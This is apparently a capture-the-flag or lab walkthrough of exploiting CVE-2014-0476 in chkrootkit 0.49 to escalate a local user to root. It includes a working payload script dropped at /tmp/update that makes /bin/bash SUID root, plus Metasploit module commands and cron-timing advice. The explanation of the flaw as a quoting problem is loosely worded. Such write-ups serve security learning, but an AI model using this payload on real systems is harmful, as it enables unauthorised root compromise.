### 1. The Vulnerability (CVE-2014-0476)

The vulnerability exists because **chkrootkit versions before 0.50** contain a design flaw where the script does not properly quote file paths. Specifically, during its scan, `chkrootkit` looks for an executable file named **`/tmp/update`** and, if found, executes it with **root privileges**.

### 2. Exploitation Steps

To elevate from a standard user like "jackie" to "root," you follow this path:

- **Enumeration:** You noticed a process `/bin/check-down` running as root. Examining its contents reveals it calls `chkrootkit`.
    
- **Version Check:** Running `chkrootkit -V` confirms version **0.49**, which is verified as vulnerable.
    
- **Creating the Payload:** To exploit this manually, you would create a malicious script at `/tmp/update`. Because `chkrootkit` runs it as root, any command inside that file (like adding a user to `/etc/passwd` or spawning a reverse shell) will execute with full administrative power.
    
    Bash
    
    ```
    echo "#!/bin/bash" > /tmp/update
    echo "chmod +s /bin/bash" >> /tmp/update  # Makes bash SUID root
    chmod +x /tmp/update
    ```
    

### 3. Using Metasploit

Metasploit automates this entire process with a specific module.

|**Command**|**Purpose**|
|---|---|
|`use exploit/unix/local/chkrootkit`|Loads the specific LPE module for this vulnerability.|
|`set SESSION <ID>`|Targets your existing session as the user "jackie".|
|`set CHKROOTKIT /path/to/chkrootkit`|(Optional) Manually points to the binary if it's not in the standard PATH.|
|`exploit`|Metasploit creates the `/tmp/update` file and waits for the root process to trigger it.|

### ⚠️ Important Note on Timing

In many environments, `chkrootkit` is run via a **cron job** (e.g., every 24 hours). If you are using the Metasploit module, you may have to wait for that scheduled task to run before your root shell is returned. This is why the module often has a high `WfsDelay` (Wait for Session Delay).

